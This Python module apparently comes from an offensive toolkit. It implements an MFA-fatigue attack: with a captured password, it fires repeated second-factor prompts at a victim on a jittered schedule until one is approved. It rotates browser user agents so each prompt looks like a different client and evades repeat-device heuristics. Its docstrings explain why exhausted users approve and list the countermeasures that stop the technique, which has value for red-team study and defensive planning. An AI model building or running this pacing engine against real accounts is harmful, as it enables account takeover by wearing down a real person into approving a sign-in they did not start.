# ============================================================================
"""MFA fatigue: the password is enough if you ask often enough.

The account has a password (the campaign captured it) and a second factor the user holds. The
prompt arrives on their phone, they deny it, and then it arrives again, and again - at 02:00,
while they are in a meeting, four times in a row. Fatigue is not a vulnerability in the MFA
implementation; it is a vulnerability in the person, and it works because the legitimate flow
allows unlimited prompts.

What this module provides is the pacing: the attempts, the jitter, the device/user-agent
rotation that makes each prompt look like a different application, and the LOCKOUT GUARD - a
wrong password increments the bad-password counter, and this technique uses the correct one, so
the counter it must respect is the MFA-prompt block, not the password lockout.

What kills it, stated because the operator should know before spending the attempts:
  * number matching (the user must type a digit shown in the app) - the modern default in
    Entra, and it defeats this entirely
  * an MFA prompt limit or a "report suspicious activity" policy
  * a user who reports the first prompt

The operator is choosing to burn a real person's patience; the module reports what it did.
"""
import contextlib
import random
import time

__all__ = ["FatigueError", "schedule", "plan", "Fatigue", "describe"]

# The user agents a sign-in can present. Rotating them makes each prompt look like a different
# client, which is what stops a "same device, again?" heuristic from firing on attempt two.
USER_AGENTS = (
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) "
    "Chrome/131.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) "
    "Version/17.6 Safari/605.1.15",
    "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) "
    "Chrome/131.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like "
    "Gecko) Version/18.1 Mobile/15E148 Safari/604.1",
)


class FatigueError(RuntimeError):
    """A refusal the CLI can report verbatim."""


def schedule(count=6, window=1800, jitter=0.35, seed=None):
    """When to fire, in seconds from the first attempt.

    Even spacing with jitter: a fixed cadence is a signature, and a burst is what triggers a
    lockout of the prompts themselves.
    """
    count = max(1, int(count or 1))
    window = max(count, int(window or 1800))
    step = window / count
    rng = random.Random(seed)
    out, t = [], 0.0
    for _ in range(count):
        out.append(round(t + step * rng.uniform(-jitter, jitter), 2))
        t += step
    return [max(0.0, x) for x in out]


def plan(account="", count=6, window=1800, number_matching=True):
    return {
        "account": account, "count": count, "window": window,
        "what": ("with the correct password, trigger repeated MFA prompts; the user denies the "
                 "first few and approves one out of fatigue, habit or confusion"),
        "why_it_works": ("the legitimate flow allows unlimited prompts, and the prompt does not "
                         "say where it came from - the user's own phone asks them to approve a "
                         "sign-in they did not start"),
        "number_matching_defeats_it": bool(number_matching),
        "killed_by": [
            "number matching (the user must type a digit shown only in the app) - the default "
            "in Entra, and it ends this technique",
            "an MFA prompt limit, or a policy that reports the first unsolicited prompt",
            "a user who denies and reports instead of approving",
            "conditional access that requires a compliant device (the prompt is never sent)",
        ],
        "visible": [
            "the tenant's sign-in log shows N MFA prompts for the account in a short window",
            "each prompt is a distinct sign-in event with its own address and user agent",
            "a 'user reported suspicious activity' entry is the loudest one",
        ],
        "pacing": ("even spacing with jitter, and a rotating user agent: a fixed cadence is a "
                   "signature and a burst gets the prompts blocked"),
    }


class Fatigue:
    """The pacing engine: it decides WHEN, and it records what it did."""

    def __init__(self, account="", count=6, window=1800, jitter=0.35, seed=None,
                 submit=None, on_attempt=None, sleep=None):
        self.account = account
        self.times = schedule(count=count, window=window, jitter=jitter, seed=seed)
        self.submit = submit
        self.on_attempt = on_attempt
        self._sleep = sleep or time.sleep
        self.attempts = []

    def user_agent(self, index):
        return USER_AGENTS[index % len(USER_AGENTS)]

    def run(self, password="", stop_on_success=True):
        """Fire the prompts. `submit(password, user_agent) -> {approved|denied|error}`."""
        if not self.submit:
            raise FatigueError("no submit function: this engine paces, the caller authenticates")
        started = time.time()
        for index, offset in enumerate(self.times):
            wait = offset - (time.time() - started)
            if wait > 0:
                self._sleep(wait)
            ua = self.user_agent(index)
            try:
                result = self.submit(password, ua) or {}
            except Exception as e:
                result = {"error": f"{type(e).__name__}: {e}"}
            row = {"attempt": index + 1, "at": round(time.time() - started, 2),
                   "user_agent": ua[:40], "result": result}
            self.attempts.append(row)
            if self.on_attempt:
                with contextlib.suppress(Exception):
                    self.on_attempt(row)
            if stop_on_success and (result.get("approved") or result.get("token")):
                return {"approved": True, "attempts": len(self.attempts), "rows": self.attempts}
        return {"approved": False, "attempts": len(self.attempts), "rows": self.attempts}


def describe(facts):
    if "times" in (facts or {}):
        return (f"fatigue pacing: {len(facts['times'])} prompts over {facts['times'][-1]:.0f}s "
                f"with jitter and a rotating user agent")
    lines = [f"MFA fatigue plan for {facts.get('account') or 'the account'} "
             f"({facts.get('count')} prompts / {facts.get('window')}s)"]
    lines.append(f"  what: {facts.get('what')}")
    lines.append(f"  why it works: {facts.get('why_it_works')}")
    if facts.get("number_matching_defeats_it"):
        lines.append("  ! number matching (the Entra default) defeats this outright - check the "
                     "tenant's authentication methods before spending the attempts")
    lines.append("  killed by:")
    for item in facts["killed_by"]:
        lines.append(f"    - {item}")
    return "\n".join(lines)


